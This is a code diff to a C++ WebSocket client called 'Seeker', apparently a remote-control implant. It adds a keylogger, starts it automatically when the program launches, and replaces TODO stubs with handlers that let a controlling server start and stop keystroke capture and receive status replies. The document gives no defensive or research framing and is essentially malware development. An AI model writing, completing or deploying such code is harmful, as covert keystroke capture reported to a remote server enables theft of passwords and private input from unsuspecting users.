@@ -1,7 +1,7 @@
 #include "./src/websocket_client.hpp"
 #include "./src/user_info.hpp"
 #include "./src/file_transfer.hpp"
-
+#include "./src/keylogger.hpp"
 #include <nlohmann/json.hpp>
 #include <iostream>
 #include <string>
@@ -26,8 +26,10 @@ struct Seeker {
 
 int main() {
     WebSocketClient client("localhost", 8080, "/ws/seeker");
+    KeyLogger keylogger(client);
 
-    client.setMessageCallback([&client](const std::string& message, size_t len) {
+    keylogger.start();
+    client.setMessageCallback([&client, &keylogger](const std::string& message, size_t len) {
         std::cout << "[Server] " << message << std::endl;
 
         try {
@@ -77,15 +79,20 @@ int main() {
             }
             else if (msg_type == "keylogger_command") {
                 if (msg_data == "start") {
-                    // TODO: Start a keylogger to capture keystrokes
-                    // Send captured keystrokes to the server
+                    keylogger.start();
+                    nlohmann::json response;
+                    response["type"] = "keylogger_output";
+                    response["data"] = "[Info] Keylogger started";
+                    client.sendMessage(response.dump());
                 }
                 else if (msg_data == "stop") {
-                    // TODO: Stop the active keylogger
-                    // Clean up any resources used by the keylogger
+                    keylogger.stop();
+                    nlohmann::json response;
+                    response["type"] = "keylogger_output";
+                    response["data"] = "[Info] Keylogger stopped";
+                    client.sendMessage(response.dump());
                 }
                 else {
-                    // TODO: Send an error message back to the server indicating unknown keylogger command
                     nlohmann::json response;
                     response["type"] = "keylogger_output";
                     response["data"] = "[Info] Unknown keylogger_command: " + msg_data;
